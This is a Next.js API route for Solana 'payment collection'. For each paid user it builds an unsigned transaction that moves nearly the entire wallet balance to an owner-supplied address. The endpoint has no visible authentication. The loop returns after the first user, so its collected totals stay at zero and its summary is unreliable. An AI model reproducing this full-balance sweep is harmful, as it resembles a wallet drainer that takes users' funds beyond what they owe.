import { NextRequest, NextResponse } from 'next/server';
import { SessionManager } from '@/lib/sessionManager';

// Build-safe Solana imports - only load at runtime
let Connection: any, PublicKey: any, Keypair: any, LAMPORTS_PER_SOL: any, Transaction: any, SystemProgram: any;

const loadSolanaLibraries = () => {
  if (typeof window === 'undefined' && !Connection) {
    try {
      const solanaWeb3 = require('@solana/web3.js');
      Connection = solanaWeb3.Connection;
      PublicKey = solanaWeb3.PublicKey;
      Keypair = solanaWeb3.Keypair;
      LAMPORTS_PER_SOL = solanaWeb3.LAMPORTS_PER_SOL;
      Transaction = solanaWeb3.Transaction;
      SystemProgram = solanaWeb3.SystemProgram;
    } catch (error) {
      console.warn('Failed to load Solana libraries:', error);
    }
  }
};

export async function POST(req: NextRequest) {
  try {
    const { ownerWallet, rpcUrl = 'https://api.mainnet-beta.solana.com' } = await req.json();

    if (!ownerWallet) {
      return NextResponse.json({ 
        success: false, 
        error: 'Owner wallet address is required' 
      }, { status: 400 });
    }

    // Load Solana libraries at runtime
    loadSolanaLibraries();

    // Check if Solana libraries are available
    if (!PublicKey || !Connection) {
      return NextResponse.json({ 
        success: false, 
        error: 'Solana libraries not available during build' 
      }, { status: 503 });
    }

    // Validate owner wallet address
    let ownerPublicKey: any;
    try {
      ownerPublicKey = new PublicKey(ownerWallet);
    } catch (error) {
      return NextResponse.json({ 
        success: false, 
        error: 'Invalid owner wallet address' 
      }, { status: 400 });
    }

    const sessionManager = SessionManager.getInstance();
    const allUsers = await sessionManager.getAllUsers();
    
    // Filter only paid users with balances
    const paidUsers = allUsers.filter((user: any) => user.isPaid && user.amountReceived && user.amountReceived > 0);
    
    if (paidUsers.length === 0) {
      return NextResponse.json({ 
        success: true, 
        message: 'No payments to collect',
        totalCollected: 0,
        collectedCount: 0
      });
    }

    // Connect to Solana
    const connection = new Connection(rpcUrl, 'confirmed');
    
    let totalCollected = 0;
    let collectedCount = 0;
    const failedCollections: string[] = [];

    // Process each paid user
    for (const user of paidUsers) {
      try {
        const userAny = user as any;
        
        // Get user's wallet address
        const walletAddress = userAny.walletAddress;
        if (!walletAddress) {
          console.log(`Skipping user ${userAny.sessionId}: No wallet address`);
          continue;
        }

        // Get user's balance
        const balance = await connection.getBalance(new PublicKey(walletAddress));
        const balanceInSol = balance / LAMPORTS_PER_SOL;

        if (balanceInSol < 0.001) {
          console.log(`Skipping user ${userAny.sessionId}: Insufficient balance (${balanceInSol} SOL)`);
          continue;
        }

        // Calculate transfer amount (leave 0.001 SOL for gas)
        const transferAmount = balanceInSol - 0.001;
        const transferLamports = Math.floor(transferAmount * LAMPORTS_PER_SOL);

        if (transferLamports <= 0) {
          console.log(`Skipping user ${userAny.sessionId}: Transfer amount too small`);
          continue;
        }

        // Create transfer transaction
        const transaction = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: new PublicKey(walletAddress),
            toPubkey: ownerPublicKey,
            lamports: transferLamports,
          })
        );

        // Get recent blockhash
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = new PublicKey(walletAddress);

        // Serialize transaction
        const serializedTransaction = transaction.serialize({
          requireAllSignatures: false,
          verifySignatures: false
        });

        // Return transaction for signing
        return NextResponse.json({
          success: true,
          transaction: serializedTransaction.toString('base64'),
          userSessionId: userAny.sessionId,
          walletAddress,
          transferAmount,
          balanceInSol
        });

      } catch (error) {
        console.error(`Error processing user ${(user as any).sessionId}:`, error);
        continue;
      }
    }

    return NextResponse.json({
      success: true,
      totalCollected: totalCollected.toFixed(6),
      collectedCount,
      failedCollections,
      message: `Collected ${totalCollected.toFixed(6)} SOL from ${collectedCount} wallets`
    });

  } catch (error: unknown) {
    console.error('Payment collection error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown collection error';
    return NextResponse.json({ 
      success: false, 
      error: errorMessage 
    }, { status: 500 });
  }
} 